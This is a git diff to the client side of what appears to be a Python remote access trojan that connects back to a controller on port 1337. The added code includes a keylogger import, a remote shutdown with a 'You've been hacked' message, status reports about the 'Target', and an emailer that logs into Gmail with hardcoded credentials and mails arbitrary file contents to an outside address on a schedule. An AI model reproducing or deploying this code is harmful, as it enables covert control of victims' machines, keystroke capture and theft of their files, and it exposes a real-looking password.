@@ -10,16 +10,19 @@
 +-----------------------------------------------------------------------+
 
 """
-import os
-import platform
-import socket
-import subprocess
-import sys
-import time
-from pprint import pprint
-from zipfile import ZipFile
+import datetime                                 # Scheduler
+import os                                       # running commands
+import platform                                 # System information
+import schedule                                 # Scheduler
+import smtplib                                  # Emailer
+import socket                                   # Socket Connection
+import subprocess                               # Running commands
+import sys                                      # System Information
+import time                                     # Sleep
+from pprint import pprint                       # Pretty Printing & Output
+from zipfile import ZipFile                     # Zipping Archives for file transfer
 
-from pynput.keyboard import Controller, Key
+from pynput.keyboard import Controller, Key     # Keylogger
 
 
 class Client:
@@ -29,7 +32,7 @@ class Client:
         self.PORT = port
         self.BUFFER_SIZE = buffer_size
         self.CLIENT_IP = client_ip
-        # self.recvcounter = 0
+        self.recvcounter = 0
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.FinalSwitcher = {
             "-Host": self.sendHostInfo,
@@ -60,11 +63,37 @@ class Client:
             # todo
             print("Pairing Failed")
             self.client.send("MISMATCH".encode("utf-8"))
-            self.close()
+            self.client.close()
 
         else:
             print("KEYS MATCHED - PAIRING SUCCESSFUL")
             self.client.send("MATCH".encode("utf-8"))
+
+    # try to update buffer size
+    def updateBuffer(self, size):
+        buff = ""
+        for counter in range(0, len(size)):
+            if size[counter].isdigit():
+                buff += size[counter]
+
+        return int(buff)
+
+    # for big files
+    def saveBigFile(self, size, buff):
+        full = b''
+        while True:
+            if sys.getsizeof(full) >= size:
+                break
+
+            recvfile = self.client.recv(buff)
+
+            full += recvfile
+
+        return full
+
+
+
+
 
     def sendHostInfo(self):
         """ Extracting host information """
@@ -129,35 +158,41 @@ class Client:
     def shutdown(self):
         #msg = "shutdown /s"
         #self.runrun(msg)
+        # self.client.send("[+] PC SHUTDOWN.".encode("utf-8"))
         self.locksystem()
 
     def shutdownmessage(self):
         msg = "shutdown /s /e 'You've been hacked '"
         self.runrun(msg)
+        self.client.send(("[+] PC SHUTDOWN WITH MESSAGE." + msg).encode("utf-8"))
 
     def restart(self):
         msg = "shutdown /r"
         self.runrun(msg)
-
+        self.client.send("[+] PC RESTARTED.".encode("utf-8"))
 
 # ''' TELNET FUNCTIONS '''
     def enableTN(self):
         msg = "start /B start cmd.exe @cmd /c pkgmgr /iu:TelnetClient "
         self.runrun(msg)
+        self.client.send("[+] Telnet Client Enabled".encode("utf-8"))
 
     def playchess(self):
         msg = "start /B start cmd.exe @cmd /c telnet freechess.org "
         self.runrun(msg)
+        self.client.send("[+] Target is now playing Chess".encode("utf-8"))
         # chess_true = subprocess.check_call("start /B start cmd.exe @cmd /k telnet freechess.org ", shell=True)
 
     def playstarwars(self):
         msg = "start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl "
         self.runrun(msg)
+        self.client.send("[+] Target is now Watching Star Wars Ep.IV: A New Hope".encode("utf-8"))
         # Sw = subprocess.check_call("start /B start cmd.exe @cmd /c telnet towel.blinkenlights.nl ", shell=True)
 
     def weather(self):
         msg = "start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com "
         self.runrun(msg)
+        self.client.send("[+] Target is now checking the Weather".encode("utf-8"))
         # weather = subprocess.check_call("start /B start cmd.exe @cmd /c telnet rainmaker.wunderground.com ", shell=True)
 
 # ''' KEYLOGGER FUNCTIONS '''
@@ -195,7 +230,6 @@ class Client:
         except Exception as e:
             print("This failed too (runrun) : " + str(e) + " + " + str(obj))
 
-
     def MSGBOX(self):
         insert = "this is a test"
 
@@ -209,7 +243,6 @@ class Client:
         message = self.client.recv(self.BUFFER_SIZE).decode()
         print("Server:", message)
         # self.send(output.encode())
-        # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
         time.sleep(2)
         self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
@@ -274,6 +307,42 @@ class Client:
                 print("Server: msg = " + msg)
                 self.client.send("[+] Message displayed and closed.".encode("utf-8"))
 
+# ''' EMAILER FUNCTIONS '''
+    def emailsendbody(self, body):
+        # creates SMTP session
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        s.ehlo()
+
+        # start TLS for security
+        s.starttls()
+
+        # Authentication
+        s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")
+
+        # message to be sent
+        message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), body)
+        print(message)
+
+        # sending the mail
+        s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)
+
+        # terminating the session
+        s.quit()
+
+    def emailsendfilepath(self, filepath):
+        if os.path.exists(filepath):
+            with open(filepath, 'r') as file:
+                body = file.read()
+                self.emailsendbody(body)
+        else:
+            print("FILE DOESNT EXIST")
+
+    def Scheduler(self):
+        # SCHEDULER
+        schedule.every().day.at("15:46").do(self.emailsendbody, "This is a schedule test")
+        while True:
+            schedule.run_pending()
+            time.sleep(1)
 def main():
     SERVER_IP = "192.168.56.1"  # modify me
     PORT = 1337  # modify me (if you want)
